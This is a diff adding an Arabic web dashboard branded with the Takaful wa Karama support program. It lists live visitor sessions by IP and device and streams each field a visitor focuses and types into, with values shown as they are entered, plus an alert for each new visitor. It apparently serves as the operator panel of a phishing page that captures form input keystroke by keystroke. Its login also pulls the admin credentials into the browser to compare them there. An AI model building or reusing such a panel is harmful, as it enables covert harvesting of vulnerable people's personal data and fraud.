@@ -1,0 +1,842 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>تتبع مباشر — تكافل وكرامة</title>
+  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --primary: #1a7a3c;
+      --primary-dark: #145e2e;
+      --bg: #0a0f1a;
+      --panel: #111827;
+      --card: #1e2533;
+      --card-hover: #252d3e;
+      --border: rgba(255,255,255,0.07);
+      --text: #e2e8f0;
+      --muted: #718096;
+      --active-glow: #22c55e;
+      --away-glow: #f59e0b;
+      --left-glow: #64748b;
+    }
+
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      font-family: 'Cairo', 'Segoe UI', Tahoma, Arial, sans-serif;
+      background: var(--bg);
+      color: var(--text);
+      min-height: 100vh;
+      overflow: hidden;
+    }
+
+    /* ── Login ─────────────────────────────────────────── */
+    #loginScreen {
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
+    }
+
+    .login-box {
+      background: white;
+      border-radius: 20px;
+      padding: 40px 36px;
+      width: 100%;
+      max-width: 380px;
+      box-shadow: 0 20px 60px rgba(0,0,0,0.5);
+      text-align: center;
+      color: #1a202c;
+    }
+
+    .login-box .logo { font-size: 3rem; margin-bottom: 10px; }
+    .login-box h2 { font-size: 1.3rem; font-weight: 700; margin-bottom: 4px; }
+    .login-box p  { font-size: 0.85rem; color: #718096; margin-bottom: 24px; }
+
+    .login-box input {
+      width: 100%;
+      padding: 12px 16px;
+      border: 1.5px solid #e2e8f0;
+      border-radius: 10px;
+      font-size: 1rem;
+      margin-bottom: 12px;
+      outline: none;
+      direction: ltr;
+      text-align: left;
+      font-family: inherit;
+      transition: border-color 0.2s;
+    }
+
+    .login-box input:focus { border-color: var(--primary); }
+
+    .login-btn {
+      width: 100%;
+      padding: 13px;
+      background: linear-gradient(135deg, var(--primary), var(--primary-dark));
+      color: white;
+      border: none;
+      border-radius: 10px;
+      font-size: 1rem;
+      font-weight: 700;
+      cursor: pointer;
+      font-family: inherit;
+      transition: opacity 0.2s;
+    }
+
+    .login-btn:hover { opacity: 0.9; }
+    .login-error { color: #e53e3e; font-size: 0.85rem; margin-top: 10px; display: none; }
+
+    /* ── App layout ─────────────────────────────────────── */
+    #appScreen { display: none; flex-direction: column; height: 100vh; }
+
+    /* Header */
+    .app-header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 0 20px;
+      height: 56px;
+      background: var(--panel);
+      border-bottom: 1px solid var(--border);
+      flex-shrink: 0;
+      gap: 12px;
+    }
+
+    .header-brand {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      font-weight: 700;
+      font-size: 0.95rem;
+    }
+
+    .live-dot {
+      width: 10px; height: 10px;
+      border-radius: 50%;
+      background: #ef4444;
+      box-shadow: 0 0 0 0 rgba(239,68,68,0.6);
+      animation: pulse-red 1.5s ease-in-out infinite;
+      flex-shrink: 0;
+    }
+
+    @keyframes pulse-red {
+      0%   { box-shadow: 0 0 0 0 rgba(239,68,68,0.6); }
+      70%  { box-shadow: 0 0 0 8px rgba(239,68,68,0); }
+      100% { box-shadow: 0 0 0 0 rgba(239,68,68,0); }
+    }
+
+    .live-badge {
+      background: #ef4444;
+      color: white;
+      font-size: 0.7rem;
+      font-weight: 700;
+      padding: 1px 7px;
+      border-radius: 20px;
+    }
+
+    .session-count {
+      background: rgba(255,255,255,0.1);
+      color: var(--text);
+      font-size: 0.78rem;
+      padding: 4px 10px;
+      border-radius: 20px;
+    }
+
+    .header-actions { display: flex; align-items: center; gap: 8px; }
+
+    .icon-btn {
+      background: rgba(255,255,255,0.07);
+      border: 1px solid var(--border);
+      color: var(--text);
+      border-radius: 8px;
+      padding: 6px 12px;
+      font-size: 0.8rem;
+      cursor: pointer;
+      font-family: inherit;
+      transition: background 0.2s;
+      display: flex;
+      align-items: center;
+      gap: 5px;
+    }
+
+    .icon-btn:hover { background: rgba(255,255,255,0.12); }
+    .icon-btn.muted { opacity: 0.45; }
+
+    /* Body split */
+    .app-body {
+      display: flex;
+      flex: 1;
+      overflow: hidden;
+    }
+
+    /* Sessions sidebar (right in RTL) */
+    .sessions-panel {
+      width: 300px;
+      flex-shrink: 0;
+      background: var(--panel);
+      border-left: 1px solid var(--border);
+      display: flex;
+      flex-direction: column;
+      overflow: hidden;
+    }
+
+    .panel-header {
+      padding: 14px 16px 10px;
+      font-size: 0.78rem;
+      font-weight: 700;
+      color: var(--muted);
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      border-bottom: 1px solid var(--border);
+      flex-shrink: 0;
+    }
+
+    .sessions-list {
+      flex: 1;
+      overflow-y: auto;
+      padding: 8px;
+    }
+
+    .sessions-list::-webkit-scrollbar { width: 4px; }
+    .sessions-list::-webkit-scrollbar-track { background: transparent; }
+    .sessions-list::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.1); border-radius: 2px; }
+
+    .session-card {
+      background: var(--card);
+      border-radius: 10px;
+      padding: 12px;
+      margin-bottom: 8px;
+      cursor: pointer;
+      border: 1.5px solid transparent;
+      transition: all 0.2s;
+      position: relative;
+    }
+
+    .session-card:hover { background: var(--card-hover); }
+    .session-card.selected { border-color: var(--primary); background: var(--card-hover); }
+
+    .session-card-top {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      margin-bottom: 6px;
+    }
+
+    .status-dot {
+      width: 8px; height: 8px;
+      border-radius: 50%;
+      flex-shrink: 0;
+    }
+
+    .status-dot.active {
+      background: var(--active-glow);
+      box-shadow: 0 0 6px var(--active-glow);
+      animation: pulse-green 2s ease-in-out infinite;
+    }
+
+    .status-dot.away { background: var(--away-glow); }
+    .status-dot.left { background: var(--left-glow); }
+
+    @keyframes pulse-green {
+      0%, 100% { box-shadow: 0 0 4px var(--active-glow); }
+      50%       { box-shadow: 0 0 10px var(--active-glow); }
+    }
+
+    .session-ip {
+      font-size: 0.82rem;
+      font-weight: 700;
+      color: var(--text);
+      flex: 1;
+      direction: ltr;
+      text-align: right;
+    }
+
+    .session-device-icon { font-size: 1rem; }
+
+    .session-meta {
+      display: flex;
+      justify-content: space-between;
+      font-size: 0.72rem;
+      color: var(--muted);
+      margin-bottom: 5px;
+    }
+
+    .session-field {
+      font-size: 0.75rem;
+      color: #a0aec0;
+      background: rgba(255,255,255,0.05);
+      padding: 3px 8px;
+      border-radius: 6px;
+      text-overflow: ellipsis;
+      overflow: hidden;
+      white-space: nowrap;
+      display: none;
+    }
+
+    .session-field.visible { display: block; }
+
+    .empty-state {
+      text-align: center;
+      padding: 60px 20px;
+      color: var(--muted);
+    }
+
+    .empty-state .icon { font-size: 2.5rem; margin-bottom: 10px; }
+    .empty-state p { font-size: 0.85rem; }
+
+    /* Events timeline (left/main) */
+    .events-panel {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      overflow: hidden;
+    }
+
+    .events-header {
+      padding: 14px 20px 10px;
+      border-bottom: 1px solid var(--border);
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      flex-shrink: 0;
+    }
+
+    .events-title {
+      font-size: 0.85rem;
+      font-weight: 700;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .events-subtitle {
+      font-size: 0.75rem;
+      color: var(--muted);
+    }
+
+    .events-feed {
+      flex: 1;
+      overflow-y: auto;
+      padding: 16px 20px;
+    }
+
+    .events-feed::-webkit-scrollbar { width: 4px; }
+    .events-feed::-webkit-scrollbar-track { background: transparent; }
+    .events-feed::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.1); border-radius: 2px; }
+
+    .event-row {
+      display: flex;
+      gap: 10px;
+      margin-bottom: 8px;
+      align-items: flex-start;
+      animation: fadeSlide 0.3s ease;
+    }
+
+    @keyframes fadeSlide {
+      from { opacity: 0; transform: translateY(6px); }
+      to   { opacity: 1; transform: translateY(0); }
+    }
+
+    .event-time {
+      font-size: 0.7rem;
+      color: var(--muted);
+      white-space: nowrap;
+      padding-top: 3px;
+      direction: ltr;
+      flex-shrink: 0;
+      width: 54px;
+      text-align: left;
+    }
+
+    .event-icon {
+      width: 28px; height: 28px;
+      border-radius: 8px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 0.85rem;
+      flex-shrink: 0;
+    }
+
+    .event-body {
+      flex: 1;
+      background: var(--card);
+      border-radius: 8px;
+      padding: 8px 12px;
+      border-right: 3px solid transparent;
+    }
+
+    .event-label {
+      font-size: 0.78rem;
+      color: var(--muted);
+      margin-bottom: 2px;
+    }
+
+    .event-value {
+      font-size: 0.88rem;
+      font-weight: 600;
+      color: var(--text);
+      word-break: break-all;
+    }
+
+    /* Event type colors */
+    .ev-page_load    .event-icon { background: rgba(99,102,241,0.15); }
+    .ev-page_load    .event-body { border-color: #6366f1; }
+    .ev-field_focus  .event-icon { background: rgba(59,130,246,0.15); }
+    .ev-field_focus  .event-body { border-color: #3b82f6; }
+    .ev-field_input  .event-icon { background: rgba(34,197,94,0.15); }
+    .ev-field_input  .event-body { border-color: #22c55e; }
+    .ev-field_blur   .event-icon { background: rgba(100,116,139,0.15); }
+    .ev-field_blur   .event-body { border-color: #64748b; }
+    .ev-radio_change .event-icon { background: rgba(245,158,11,0.15); }
+    .ev-radio_change .event-body { border-color: #f59e0b; }
+    .ev-form_submit  .event-icon { background: rgba(34,197,94,0.2); }
+    .ev-form_submit  .event-body { border-color: #16a34a; }
+    .ev-inquiry      .event-icon { background: rgba(168,85,247,0.15); }
+    .ev-inquiry      .event-body { border-color: #a855f7; }
+    .ev-visibility_hidden  .event-icon { background: rgba(239,68,68,0.1); }
+    .ev-visibility_hidden  .event-body { border-color: #ef4444; }
+    .ev-visibility_visible .event-icon { background: rgba(34,197,94,0.1); }
+    .ev-visibility_visible .event-body { border-color: #22c55e; }
+    .ev-page_unload  .event-icon { background: rgba(239,68,68,0.15); }
+    .ev-page_unload  .event-body { border-color: #dc2626; }
+    .ev-heartbeat    .event-icon { background: rgba(20,184,166,0.1); }
+    .ev-heartbeat    .event-body { border-color: #14b8a6; }
+
+    /* No session selected */
+    .no-session {
+      display: flex;
+      flex: 1;
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
+      color: var(--muted);
+      gap: 12px;
+    }
+
+    .no-session .ns-icon { font-size: 3rem; opacity: 0.3; }
+    .no-session p { font-size: 0.88rem; }
+
+    /* Loading spinner */
+    .spin {
+      display: inline-block;
+      width: 20px; height: 20px;
+      border: 2px solid rgba(255,255,255,0.15);
+      border-top-color: var(--primary);
+      border-radius: 50%;
+      animation: spin .7s linear infinite;
+    }
+
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    /* Notification toast */
+    .notif {
+      position: fixed;
+      bottom: 20px;
+      left: 50%;
+      transform: translateX(-50%) translateY(80px);
+      background: var(--primary);
+      color: white;
+      padding: 10px 20px;
+      border-radius: 30px;
+      font-size: 0.88rem;
+      font-weight: 700;
+      transition: transform 0.4s cubic-bezier(0.34,1.56,0.64,1);
+      z-index: 9999;
+      pointer-events: none;
+      white-space: nowrap;
+    }
+
+    .notif.show { transform: translateX(-50%) translateY(0); }
+
+    @media (max-width: 640px) {
+      .sessions-panel { width: 240px; }
+    }
+  </style>
+</head>
+<body>
+
+<!-- Login -->
+<div id="loginScreen">
+  <div class="login-box">
+    <div class="logo">👁️</div>
+    <h2>مراقبة المستخدمين</h2>
+    <p>تتبع مباشر — تكافل وكرامة</p>
+    <input type="text" id="loginUser" placeholder="اسم المستخدم" autocomplete="off">
+    <input type="password" id="loginPass" placeholder="كلمة المرور">
+    <button class="login-btn" onclick="doLogin()">دخول</button>
+    <div class="login-error" id="loginError">❌ بيانات غير صحيحة</div>
+  </div>
+</div>
+
+<!-- App -->
+<div id="appScreen">
+  <header class="app-header">
+    <div class="header-brand">
+      <div class="live-dot"></div>
+      <span class="live-badge">LIVE</span>
+      <span>تتبع المستخدمين</span>
+      <span class="session-count" id="sessionCount">0 جلسة</span>
+    </div>
+    <div class="header-actions">
+      <button class="icon-btn" id="soundBtn" onclick="toggleSound()">🔔 الصوت</button>
+      <a href="admin.html" class="icon-btn" style="text-decoration:none;">← الإدارة</a>
+      <button class="icon-btn" onclick="doLogout()">خروج</button>
+    </div>
+  </header>
+
+  <div class="app-body">
+
+    <!-- Events panel (left in RTL) -->
+    <div class="events-panel">
+      <div id="noSession" class="no-session">
+        <div class="ns-icon">🖱️</div>
+        <p>اختر جلسة لعرض أحداثها</p>
+      </div>
+
+      <div id="eventsView" style="display:none; flex-direction:column; flex:1; overflow:hidden;">
+        <div class="events-header">
+          <div>
+            <div class="events-title" id="eventsTitle">اختر جلسة</div>
+            <div class="events-subtitle" id="eventsSubtitle"></div>
+          </div>
+          <button class="icon-btn" onclick="clearSelection()">✕ إغلاق</button>
+        </div>
+        <div class="events-feed" id="eventsFeed"></div>
+      </div>
+    </div>
+
+    <!-- Sessions panel (right in RTL = appears first in flex) -->
+    <div class="sessions-panel">
+      <div class="panel-header">الجلسات النشطة</div>
+      <div class="sessions-list" id="sessionsList">
+        <div class="empty-state">
+          <div class="icon">🌐</div>
+          <p>لا توجد جلسات حالياً</p>
+          <p style="margin-top:6px;font-size:0.72rem;">ستظهر هنا عند دخول أي زائر</p>
+        </div>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<div class="notif" id="notif"></div>
+
+<script type="module">
+  import { initializeApp }          from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
+  import { getFirestore, doc,
+           getDoc, collection,
+           query, orderBy,
+           onSnapshot }             from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
+
+  const firebaseConfig = {
+    apiKey: "AIzaSyBKYhw1mfkNWVvWI9GZrKQsRsgCXbtflUI",
+    authDomain: "gogerexams.firebaseapp.com",
+    projectId: "gogerexams",
+    storageBucket: "gogerexams.firebasestorage.app",
+    messagingSenderId: "261975684495",
+    appId: "1:261975684495:web:7254477c2658b62817c7fa"
+  };
+
+  const app = initializeApp(firebaseConfig);
+  const db  = getFirestore(app);
+
+  // ── State ────────────────────────────────────────────────
+  let soundEnabled  = true;
+  let selectedSid   = null;
+  let eventsUnsub   = null;
+  let sessionsUnsub = null;
+  let knownSids     = new Set();
+  let sessions      = {};   // sid → data
+
+  const EVENT_ICONS = {
+    page_load:          '🌐',
+    field_focus:        '🖊',
+    field_input:        '✏️',
+    field_blur:         '↩',
+    radio_change:       '🔘',
+    form_submit:        '✅',
+    inquiry:            '🔍',
+    visibility_hidden:  '😴',
+    visibility_visible: '👁',
+    page_unload:        '🚪',
+    heartbeat:          '💓',
+  };
+
+  const EVENT_LABELS = {
+    page_load:          'فتح الصفحة',
+    field_focus:        'نقر على حقل',
+    field_input:        'كتابة في الحقل',
+    field_blur:         'خروج من الحقل',
+    radio_change:       'تغيير الاختيار',
+    form_submit:        'إرسال النموذج',
+    inquiry:            'استعلام',
+    visibility_hidden:  'غادر التبويب',
+    visibility_visible: 'عاد للتبويب',
+    page_unload:        'أغلق الصفحة',
+    heartbeat:          'إشارة حياة',
+  };
+
+  // ── Audio ─────────────────────────────────────────────────
+  function playBeep() {
+    if (!soundEnabled) return;
+    try {
+      const ctx = new (window.AudioContext || window.webkitAudioContext)();
+      [600, 900].forEach((freq, i) => {
+        const osc = ctx.createOscillator();
+        const gain = ctx.createGain();
+        osc.connect(gain);
+        gain.connect(ctx.destination);
+        osc.frequency.value = freq;
+        osc.type = 'sine';
+        gain.gain.setValueAtTime(0.35, ctx.currentTime + i * 0.12);
+        gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + i * 0.12 + 0.3);
+        osc.start(ctx.currentTime + i * 0.12);
+        osc.stop(ctx.currentTime + i * 0.12 + 0.35);
+      });
+    } catch (_) {}
+  }
+
+  window.toggleSound = () => {
+    soundEnabled = !soundEnabled;
+    document.getElementById('soundBtn').classList.toggle('muted', !soundEnabled);
+    document.getElementById('soundBtn').textContent = soundEnabled ? '🔔 الصوت' : '🔕 صامت';
+  };
+
+  // ── Notification toast ────────────────────────────────────
+  function showNotif(msg) {
+    const el = document.getElementById('notif');
+    el.textContent = msg;
+    el.classList.add('show');
+    setTimeout(() => el.classList.remove('show'), 3500);
+  }
+
+  // ── Login ─────────────────────────────────────────────────
+  window.doLogin = async () => {
+    const u = document.getElementById('loginUser').value.trim();
+    const p = document.getElementById('loginPass').value.trim();
+    const errEl = document.getElementById('loginError');
+    errEl.style.display = 'none';
+
+    try {
+      const snap = await getDoc(doc(db, 'settings', 'admin'));
+      if (!snap.exists()) { errEl.style.display = 'block'; return; }
+      const { username, password } = snap.data();
+      if (u !== username || p !== password) { errEl.style.display = 'block'; return; }
+
+      sessionStorage.setItem('tracker_auth', '1');
+      document.getElementById('loginScreen').style.display = 'none';
+      document.getElementById('appScreen').style.display   = 'flex';
+      startListening();
+    } catch {
+      errEl.style.display = 'block';
+    }
+  };
+
+  window.doLogout = () => {
+    sessionStorage.removeItem('tracker_auth');
+    location.reload();
+  };
+
+  // Allow Enter key on login
+  ['loginUser', 'loginPass'].forEach(id => {
+    document.getElementById(id).addEventListener('keydown', e => {
+      if (e.key === 'Enter') window.doLogin();
+    });
+  });
+
+  // Auto-login if session active
+  if (sessionStorage.getItem('tracker_auth')) {
+    document.getElementById('loginScreen').style.display = 'none';
+    document.getElementById('appScreen').style.display   = 'flex';
+    startListening();
+  }
+
+  // ── Helpers ────────────────────────────────────────────────
+  function elapsed(seconds) {
+    if (!seconds) return '';
+    const diff = Math.floor(Date.now() / 1000) - seconds;
+    if (diff < 60)   return `${diff}ث`;
+    if (diff < 3600) return `${Math.floor(diff/60)}د`;
+    return `${Math.floor(diff/3600)}س`;
+  }
+
+  function deviceIcon(d) {
+    if (!d) return '💻';
+    if (/Android|iPhone|iPad|Mobile/i.test(d)) return '📱';
+    if (/Windows|Mac|Linux/i.test(d)) return '💻';
+    return '🌐';
+  }
+
+  function statusLabel(s) {
+    if (s === 'active') return 'نشط';
+    if (s === 'away')   return 'بعيد';
+    return 'خرج';
+  }
+
+  function fmtTime(ts) {
+    if (!ts?.seconds) return '';
+    return new Date(ts.seconds * 1000).toLocaleTimeString('ar-EG', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
+  }
+
+  // ── Session cards ──────────────────────────────────────────
+  function renderSessions() {
+    const list = document.getElementById('sessionsList');
+    const all  = Object.entries(sessions);
+
+    if (all.length === 0) {
+      list.innerHTML = `<div class="empty-state"><div class="icon">🌐</div><p>لا توجد جلسات حالياً</p><p style="margin-top:6px;font-size:0.72rem;">ستظهر هنا عند دخول أي زائر</p></div>`;
+      document.getElementById('sessionCount').textContent = '0 جلسة';
+      return;
+    }
+
+    // Sort: active → away → left, then by lastSeen desc
+    const sorted = all.sort(([,a],[,b]) => {
+      const order = { active: 0, away: 1, left: 2 };
+      const oa = order[a.status] ?? 2;
+      const ob = order[b.status] ?? 2;
+      if (oa !== ob) return oa - ob;
+      return (b.lastSeen?.seconds ?? 0) - (a.lastSeen?.seconds ?? 0);
+    });
+
+    const activeCount = all.filter(([,d]) => d.status === 'active').length;
+    document.getElementById('sessionCount').textContent = `${activeCount} نشط / ${all.length} إجمالي`;
+
+    list.innerHTML = sorted.map(([sid, d]) => {
+      const icon    = deviceIcon(d.userAgent || d.os);
+      const status  = d.status || 'left';
+      const field   = d.currentField ? `<div class="session-field visible">✏️ ${d.currentField}</div>` : '';
+      const sel     = sid === selectedSid ? 'selected' : '';
+      return `
+        <div class="session-card ${sel}" onclick="selectSession('${sid}')">
+          <div class="session-card-top">
+            <div class="status-dot ${status}"></div>
+            <div class="session-ip">${d.ip || '—'}</div>
+            <div class="session-device-icon">${icon}</div>
+          </div>
+          <div class="session-meta">
+            <span>${d.browser || '?'} / ${d.os || '?'}</span>
+            <span>${elapsed(d.lastSeen?.seconds)}</span>
+          </div>
+          ${field}
+        </div>`;
+    }).join('');
+  }
+
+  // ── Select session ─────────────────────────────────────────
+  window.selectSession = (sid) => {
+    selectedSid = sid;
+    renderSessions();
+    loadEvents(sid);
+  };
+
+  window.clearSelection = () => {
+    selectedSid = null;
+    if (eventsUnsub) { eventsUnsub(); eventsUnsub = null; }
+    document.getElementById('eventsView').style.display  = 'none';
+    document.getElementById('noSession').style.display   = 'flex';
+    renderSessions();
+  };
+
+  // ── Load events for a session ──────────────────────────────
+  function loadEvents(sid) {
+    if (eventsUnsub) eventsUnsub();
+
+    document.getElementById('noSession').style.display   = 'none';
+    document.getElementById('eventsView').style.display  = 'flex';
+    document.getElementById('eventsFeed').innerHTML = '<div style="text-align:center;padding:40px;color:var(--muted);"><div class="spin"></div></div>';
+
+    const d = sessions[sid] || {};
+    document.getElementById('eventsTitle').textContent    = d.ip || sid;
+    document.getElementById('eventsSubtitle').textContent = `${d.browser || ''} · ${d.os || ''} · ${d.screenRes || ''}`;
+
+    const evCol = collection(db, 'LiveSessions', sid, 'Events');
+    const q     = query(evCol, orderBy('ts', 'asc'));
+
+    eventsUnsub = onSnapshot(q, snap => {
+      const feed = document.getElementById('eventsFeed');
+      feed.innerHTML = '';
+
+      if (snap.empty) {
+        feed.innerHTML = '<div style="text-align:center;padding:40px;color:var(--muted);">لا توجد أحداث بعد</div>';
+        return;
+      }
+
+      snap.forEach(doc => {
+        const ev = doc.data();
+        feed.appendChild(buildEventRow(ev));
+      });
+
+      feed.scrollTop = feed.scrollHeight;
+    });
+  }
+
+  function buildEventRow(ev) {
+    const div = document.createElement('div');
+    div.className = `event-row ev-${ev.type}`;
+    const icon  = EVENT_ICONS[ev.type]  || '•';
+    const label = EVENT_LABELS[ev.type] || ev.type;
+    const time  = fmtTime(ev.ts);
+    const fieldLine = ev.label ? `<div class="event-label">${ev.label}</div>` : '';
+    const valLine   = ev.value ? `<div class="event-value">${escHtml(String(ev.value))}</div>` : `<div class="event-value" style="color:var(--muted)">${label}</div>`;
+    div.innerHTML = `
+      <div class="event-time">${time}</div>
+      <div class="event-icon">${icon}</div>
+      <div class="event-body">
+        ${fieldLine}
+        ${valLine}
+      </div>`;
+    return div;
+  }
+
+  function escHtml(s) {
+    return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+  }
+
+  // ── Main listener on LiveSessions ─────────────────────────
+  function startListening() {
+    let firstLoad = true;
+    const col = collection(db, 'LiveSessions');
+
+    sessionsUnsub = onSnapshot(col, snap => {
+      snap.docChanges().forEach(change => {
+        const sid  = change.doc.id;
+        const data = change.doc.data();
+
+        if (change.type === 'added') {
+          sessions[sid] = data;
+          if (!firstLoad && !knownSids.has(sid)) {
+            // Genuinely new session after initial load
+            playBeep();
+            showNotif(`🟢 زائر جديد — ${data.ip || 'IP غير معروف'} · ${data.browser || ''}`);
+          }
+          knownSids.add(sid);
+        } else if (change.type === 'modified') {
+          sessions[sid] = data;
+        } else if (change.type === 'removed') {
+          delete sessions[sid];
+          knownSids.delete(sid);
+          if (selectedSid === sid) clearSelection();
+        }
+      });
+
+      firstLoad = false;
+      renderSessions();
+
+      // Refresh selected session header if still open
+      if (selectedSid && sessions[selectedSid]) {
+        const d = sessions[selectedSid];
+        document.getElementById('eventsTitle').textContent    = d.ip || selectedSid;
+        document.getElementById('eventsSubtitle').textContent = `${d.browser || ''} · ${d.os || ''} · ${d.screenRes || ''}`;
+      }
+    });
+  }
+
+  // Re-render elapsed times every 30s
+  setInterval(renderSessions, 30000);
+</script>
+</body>
+</html>
